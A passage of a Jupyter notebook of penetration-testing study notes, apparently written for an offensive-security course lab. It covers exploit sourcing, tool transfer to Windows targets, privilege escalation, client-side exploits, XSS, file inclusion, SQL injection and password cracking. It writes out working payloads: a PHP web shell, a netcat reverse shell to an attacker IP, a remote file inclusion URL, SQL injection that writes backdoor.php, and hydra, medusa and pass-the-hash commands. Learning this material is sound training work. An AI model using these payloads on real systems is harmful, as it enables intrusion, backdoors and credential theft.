    "There are lots of fake exploits online, someone with malicious intent for anyone using it. (i.e. one should examine the payload and whether root access is required before using an exploit). Two sources for exploit are generally trusted, one is __Exploit Database__ and the other __SecurityFocus__.\n",
    "\n",
    "* In Kali, simply use __searchsploit (exploit keyword)__ to find relevant exploit in the offline version of Exploit database.\n",
    "* Or online, simply go to either website to get exploit \n",
    "\n",
    "Or better, we can modify the exploits that do not work.\n",
    "\n",
    "* Never run exploits without examining them first \n",
    "* Creating a testing environment to make sure that the exploit works \n",
    "* Checklist included, but are not limited to: \n",
    "    * shell code swapping \n",
    "    * environment setup (compiler, i.e. gcc or mingw) \n",
    "    * return address \n",
    "    * hardcoded IP/DNS/etc.. \n",
    "    * necessity of root privilege "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### File Transfer to Target Machine "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "__post exploitation__ refers to the action after a successful exploit (i.e. spawning a reverse shell), usually including privilege escalation, installing backdoors, cleaning up evidence and so on. File transfer usually include compiled exploit binaries, command line port scanners, backdoors, and password dumpers. <br>\n",
    "Linux usually have __netcat, curl, wget__ preinstalled, but Windows does not have them. So attackers normally need to 'land' some files into the target windows machine. This is usually completed with non-interactive connections. \n",
    "\n",
    "* TFTP service: TFTP is a UDP based file transfer protocol and is often resitrcted by corporate egress firewall rules. Windows OS up to Windows XP and 2003 contain TFTP client. But in version above, it need to be explicitly added during installation. \n",
    "    * in Kali Linux: __mkdir /tftp__;  __atftpd --daemon --port 69 /tftp__ ; __cp /usr/share/windows-binaries/nc.exe /etftp__ . These operations make it ready for tftp to upload the netcat executable.\n",
    "    * on Windows, simply use __tftp -i 10.11.0.5 get nc.exe__ to get the netcat executable. \n",
    "\n",
    "\n",
    "* FTP service: by default FTP is interactive, and it can be non-interactive if given a text file of inputs. \n",
    "    * on Kali, __apt-get update && apt-get install pure-ftpd__ "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "%%bash \n",
    "# bash script for setting up ftp \n",
    "#!/bin/bash\n",
    "\n",
    "groupadd ftpgroup \n",
    "useradd -g ftpgroup -d /dev/null -s /etc ftpuser\n",
    "pure-pw useradd sec -u ftpuser -d /ftphome \n",
    "pure-pw mkdb \n",
    "cd /etc/pure-ftpd/auth\n",
    "ln -s ../conf/PureDB 60pdb\n",
    "mkdir -p /ftphome\n",
    "chown -R ftpuser:ftpgroup /ftphome/\n",
    "/etc/init.d/pure-ftpd restart"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "then __chmod 755 setup-ftp__  and __./setup-ftp__. Once run, user enters password and it is configured.\n",
    "We can then begin to generate the text file __on remote target (windows)__ required to make the service non-interactive: \n",
    "* echo open (attacker IP) 21 > ftp.txt\n",
    "* echo USER (attacker name) >> ftp.txt\n",
    "* echo ftp >> ftp.txt\n",
    "* echo bin >> ftp.txt\n",
    "* echo GET nc.exe >> ftp.txt\n",
    "* echo bye >> ftp.txt\n",
    "after the setup, simply do __ftp -v -n -s:ftp.txt__ on the target machine. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "__Uploading files with scripts__ : with Powershell, VBScript, or even python on target machine. Attacker can issue HTTP download from target machine to a web server on local machine. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "* __Using debug.exe__ : The idea is to use echo to write out binary file in its hex value equivalent and then use debug.exe to assemble the written text file into a binary file. There is 64K byte size limit to the file debug.exe can generate. Normally __upx__ is used to compress the executable. The method normally works with smaller size applications \n",
    "    * on Kali, __upx -9 nc.exe__ \n",
    "    * on Windows, rebuild the file in text. with __exe2bat__ \n",
    "        * on Kali, __locate exe2bat__; then __wine exe2bat.exe nc.exe nc.txt__. This gives us a txt file representin the binary file. \n",
    "        * Open the created file on Kali, and copy and paste the content from Kali to Windows machine. Every content in the text file should be a echo command, making it non-interactive. \n",
    "        * After the copy pasting, on Windows, issue commands to convert txt file back to executable "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Privilege Escalation \n",
    "\n",
    "* __Running exploits locally__: usually the term refers to running the exploit locally, or __local privilege escalation__. An example would be that once you gained access to reverse shell on Ubuntu 11.10 32 bit machine that has not been patched against CVE 2012-0056, simply use wget to fetch the exploit, compile it, and execute. Since most exploits need to be compiled locally, the run-time environment needs to be set up. On Windows, for example, __pyinstaller.py__ module from PyWin32 can be used to create stand-alone windows executables from python scripts, with __python pyinstaller.py --onefile ms11-080.py__. \n",
    "\n",
    "* __Configuration Issues__: __icacls__ windows utility checks insecure permissions. usage: __icacls (file.exe)__. If the attacker can have the permission to modify the file, it can simply replace it will a malicious file that performs privilege escalation. (i.e. a Admin privileged file can be rewritten to make low privileged user run at admin level upon system reboot)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Client Side Attack "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "client side attack attacks client side software such as browsers. IN client side attack, the target's machine does not have to be routable from attacker's. Due to the wide attack surface clients (numerous) and their softwares (large number of), it is very difficult for the admin to monitor all of them.  <br>\n",
    "Unlike server side attack, which uses common protocols, in client side attack, port scanning is generally not enough, and information gathering is again required. \n",
    "* passive info gathering: use search engine for corporate IP and find sites with agent data. \n",
    "* Active info gathering: direct contact with the client; phishing or social engineering involved tasks.\n",
    "\n",
    "__MS12-037-Internet Explorer 8 Fixed Col Span ID__ is a security vulnerability of IE. Modify the exploit can yeild desired rsults. \n",
    "* __cd /var/www/html/__\n",
    "* __wget -O exploit.html http://www.exploit-db.com/download/24017__\n",
    "* __service apache2 start__ \n",
    "This sets up the exploit on attacker's apache server. Then simply we need the target to use browser to go to the apache server. Once done, a bind shell will appear on the target's machine. <br>\n",
    "To make it reverse shell, we need to modify the exploit by swapping out the shellcode:\n",
    "* __msfveom -p windows/shell_reverse_tcp LHOST=(localhost) LPORT=(localport) -f js_le -e generic/none__ creates the shell code.\n",
    "* If the shellcode is smaller in size than the original shellcode, add NOP to padding. (i.e. 18 bytes difference requires 18 /x99 at the end of shell code.  \n",
    "\n",
    "__JAVA signed Applet Attack__ is an attack that requires victim interaction. This is used more often since client software could be patched, and human vulnerability is often easier to exploit. The exploit assumes that the target has Java installed and enabled in their browsers. The attacker needs to compile Java program and sign the Applet. Then it shoule be embedded in an HTML file and write it to web root folder. More can be seen [here](https://pentestlab.blog/2012/03/03/java-applet-attack-method/) The user has to disregard the warning message to be tricked into the Java Applet attack.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Web Application Attack \n",
    "\n",
    "Two modules for Web application attack on Firefox: __Cookie Manager+__ and __Tamper Data__. <br>\n",
    "\n",
    "__XSS (Cross Site Scripting)__ are caused due to unsanitized user input that is then displayed on a web page in HTML format. These vulnerabilities allow malicious attackres to inject client side scripts (i.e. Javascript) into web pages viewed by other users. When the victim browse the website, these scripts can execute on the victim's browser, and it usually can steal credentials and cookies, or redirect victim's browser to a malicious HTML page. <br>\n",
    "1. Browser Redirection and IFRAME Injection: __\\<iframe SRC=\"http://10.11.0.79/report\" height= \"0\" width=\"0\">\\</iframe>__ as example html code to redirect from the inline frame, assuming attacker's IP is 10.11.0.79. The attacker can then simply listen on __nc -nlvp 80__. \n",
    "2. Cookie stealing and session tampering: Once a legitimate user logs into the application, a cookie that contains a PHP session ID is added to their session. Any further attempts to access this page by the authenticated user does not reuire re-authentication. In vulnerable session implementations, one can use javascript to have the victim's browser send us the cookie information stored for this session.\n",
    "\n",
    "__File Inclusion Vulnerabilities__, including Local (LFI) and remote (RFI) are commonly found in poorly written PHP code. It allows attacker to include a remote or local file into the webserver's running PHP code. RFI allows attacker to introduce its own code to webserver, whereas LFI makes use of files already existing on the web server. \n",
    "* __Local File Inclusion__: directly in the browser: when the PHP script stores file locally (variable). For example, the php _include_ function. In browser, a url query could contain the values for parameters. For example, to set the value for LANG variable. \n",
    "In theory, this vulnerability allows the attacker to browse the whole file system of the target machine.Sometimes the URL request would need to specify null byte %00 at the end. Sometimes not. When source code is unknown, attacker should try both. <br>\n",
    "Since the PHP include function can execute any php code in the included file, we can potentially achieve arbitrary code execution from the file included. This would involve contaminating the log file of the target machine.<br>\n",
    "\n",
    "* One way to achieve this is to type PHP code into an open connection with the target machine. Usually the system log file will capture the message been transmitted in a dedicated access log file.\n",
    "* Attacker can then access the contaminated log file from browser and execute the log file. \n",
    "* For example, the code could be <?php echo shell_exec(\\$_GET['cmd']);?>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The attacker can then append string such as __&cmd=ipconfig__ before the logfile and exeute the cmd. For a reverse shell (for example, netcat), the command should be: __cmd=nc%20-nv%20(LHOST)%20(LPORT)%20-e%20cmd.exe__. %20 in URL (unicode) represents space. Necat also need to be transferred first: __cmd=nc%20-nv%2010.11.0.55%get%20nc.exe__ after the netcat file is ready to transmit in /tftp "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "* __Remote File Inclusion__: less common than LFI and easier to exploit. In this case, LANG value can be set to the location of a file in attacker's machine (remote address). Suppose that the malicious file is stored as __evil.txt__ on attacker's machine 10.11.0.55. Then, __LANG=http://10.11.0.55/evil.txt%00__. In the file, we can store whatever PHP script we want, including the reverse shell code we used in LFI. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "__SQL Injection__: unsanitized user input for SQL database. \n",
    "When the database code uses unsanitized input as its database query argument, or argument used by SESSION or POST, they can be a part of the SQL statement.\n",
    "* login to sql:  __mysql -u root__ \n",
    "    * in sql: __show databases__ then __use webappdb__ \n",
    "    * __select * from users;__ \n",
    "    * suppose __select * from users where name='wronguser' and password='wrongpass'; __ is a wrong query.\n",
    "    * __select * from users where name='offsec' and password='123456'__  is a correct query.\n",
    "In certain buggy PHP codes, if a single row is found matching the required username and password, authentication is granted. It can be bypassed by __select * from users where name='wronguser' or 1=1;# and password='wrongpass';__ or __select * from users where name='wronguser' or 1=1 LIMIT 1;# and password='wrongpass';__, which shows the info of the first one. If the enumeration works, one can simply inject __'wronguser' or 1=1'__ in the vulnerable website's input. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Most cases, however, attackers do not have much information about the source code of web server, therefore experimentation is required. One way is to enumerate SQL database by abusing SQL query statement and gathering information about the database structures from errors. \n",
    "* For example, use __order by (number)__ to enumerate column size of the database. Some vulnerable database could return error messsage if __number__ is greater than the max column number. \n",
    "* use __union all select 1,2,3,4,5__ to see display format for data in SQL database. (suppose the result is 1,2,3,5)\n",
    "* __union all select 1,2,3,4,@@version,6__ will display SQL version in column 5. \n",
    "* __union all select 1,2,3,4,user(),6 __will display current user. \n",
    "* __union all select 1,2,3,4,table_name,6 FROM information_schema.tables__\n",
    "* __union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'__\n",
    "* __http://10.11.1.35/comment.php?id=738 union select 1,2,3,4,concat(name,0x3a,password),6 FROM users__\n",
    "* __Code Execution__: use the INTO OUTFILE SQL command. http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,\"<?php echo shell_exec($_GET['cmd']);?>\",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "It is similar to LFI attack, and the attacker can perform the attack from browser. with __cmd=__ argument"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "__ Web Application Proxies__: \n",
    "Sometimes the injection type attack would not be easy when the website restricts choice of input with a dropdown menu. When the request by webpage is HTTP POST, it is generally not allowed to modify parameters through URL manipulation. To bypass this, one can use a local web proxy. <br>\n",
    "The proxy can intercept outgoing HTTP request and edit various parameters sent, effectively bypassing all client side restrictions (__TamperData__). With tamperdata, the attacker can modify the parameters at ease."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Kali Linux has automatic tool __sqlmap__ for identify and enumerate SQL injection vulnerabilities. \n",
    "* in Kali: __sqlmap -u http://10.11.1.35 --crawl=1__ starts the crawler and find injection point.\n",
    "* Once injection is found, __sqlmap -u http://10.11.1.35/comment.php?id=738 --dmbs=mysql --dump --threads=5__ to extract information from SQL database. \n",
    "* __sqlmap__ can also attempt Web Application Firewall bypass and commit server takeover. __sqlmap -u http://10.11.1.35/comment.php?id=738 --dbms=mysql --os-shell__ executes reverse shell on target. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Password Attack\n",
    "\n",
    "When it comes to password attack, the first thing that comes in mind is __brute force__, nothing fancy. To peform the attack, one needs to have sources: _dictionary files_ and _key-space_. <br>\n",
    "The word __dictionary attack__ is therefore simply trying to come up with strings as a combination of word list (dictionary) aimed to bypassing the authentication. In kali, the dictionry is located __/usr/share/wordlists__. The most rudimentary brute force simply takes input and generate entropy: __crunch__ in kali does the job. \n",
    "* __crunch 6 6 0123456789ABCDEF -o crunch1.txt __ generates a dictionary file containing digits and alphabets, with lenght exactly as 6. (this will generate 112MB file) \n",
    "* __crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha__ creates length-4 string from a given charset. \n",
    "* __crunch 8 8 -t ,@@^^%%%__ generates len-8 string that has one upper case, two lower case, two special characters and three numeric characters. \n",
    "Brute force methods are generally not desired: They require too much space and take too much time."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": true
   },
   "source": [
    "Windows store hashed user password in Security Acount Manager (SAM) and partially encrypts it with SYSKEY. Windows NT-based OS, up to Windows 2003, store two different password hashes: LAN manager (LM), based on DES, and NT LAN Manager (NTLM), based on MD4. LM has pitfalls:\n",
    "* Passwords longer than seven characters are split into two strings and each piece is hashed separately\n",
    "* The password is converted to upper case before being hashed.\n",
    "* The LM hashing system does not include salts, making rainbow table attacks feasible \n",
    "From windows Vista and on, Windows uses NTLM, which case sensitive, support all Unicode chars, but still, passwords are not salted. <br>\n",
    "__pwdump__ and __fgdump__ are tools that uses memory attack (in particular, privileged LSASS) to crack password hashes. __fgdump__ works similar to __pwdump__ but also attempts to kill local antivirus before dumping the password hashes and cached credentials. <br>\n",
    "__WCE (Windows Credential Editor)__ is another memory attack tool that can dump the cleartext password, using either DLL injection or reading LSASS process memory. But it is more limited to older versions of Windows."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "__cewl__ can be used to customize password wordlist from give domain names: __cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt__ <br>\n",
    "Users most likely add something extra in their password. To do the same thing, one can use __jon the ripper__ to do the trick. __nano /etc/john/john.conf__ will open its configuration file, where user can add rules. \\$\\[0-9\\]$[0-9] means to add two numbers to the end of each password. <br>\n",
    "after the configuration, __john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt__. to get the final list."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "__Online Password Attack__ refers to password guessing for online services that uses password authentication. Examples include HTTP, SSH, VNC, SNMP, POP3. \n",
    "* __HTTP brute force__: using medusa: __medusa -h 10.11.1.219 -u admin -P password-file.txt -M http -m DIR:/admin -T 10__ uses 10 threads to do the work.\n",
    "* __RDP brute force__: using ncrack: __ncrack -vv --user offsec -P password-file.txt rdp://10.11.1.35__\n",
    "* __SNMP brute force__: using hydra: __hydra -P password-file.txt -v 10.11.1.219 snmp__ \n",
    "* __SSH brute force__: using hydra: __hydra -l root -P password-file.txt 10.11.1.219 ssh__\n",
    "There are cases when account lockout occurs when multiple login attempts failed. Also, brute force attack generates lots of network traffic. So one has to understand the risk and cost before conducting these attacks."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "cracking __Password Hashes__: recover the plaintext password from its hashed value. Three things are important: \n",
    "1. hash function output lenghth\n",
    "2. hash function character set\n",
    "3. hash function special characters \n",
    "\n",
    "__hash identifier__ is used to identify the hash function given the string of hash value. <br>\n",
    "__John the Ripper__ is again used to crack hash (for example, after pwdump gives the list of password hash, we can use john to process them). \n",
    "* Brute force: __john 127.0.0.1.pwdump__  (Assuming the pwdump gives 127.0.0.1.pwdump) \n",
    "* __john --wordlist=/usr/share/wordlist/rockyou.txt 127.0.0.1.pwdump__ \n",
    "* __john --rules --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump__ \n",
    "First, however, one needs to use __unshadow__ to combine __passwd__ and __shadow__ file from compromised system: __unshadow passwd-file.txt shadow-file.txt > shadowed.txt__.<br>\n",
    "__john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt__"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Unlike brute force methods, __rainbow table attack__ makes use of preexisting database of cracked results. However, password __salting__ is effective against this type of attacks."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Sometimes, one does not even need to use plaintext password, instead, hash could be good enough for authentication bypass. PTH utilizes only combination of username and __NTLM/LM__ hashes to bypass authentication. If privilege escalation can be performed and LM, NTLM hashes can be dumped, one can use __pth-winexe__ to gain shell ondifferent machines that use the same hash. This is mostly done on SMB service on windows.\n",
    "* __export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896__\n",
    "* __pth-winexe -U administrator% //10.11.01.76 cmd__."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python [default]",
   "language": "python",
   "name": "python2"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
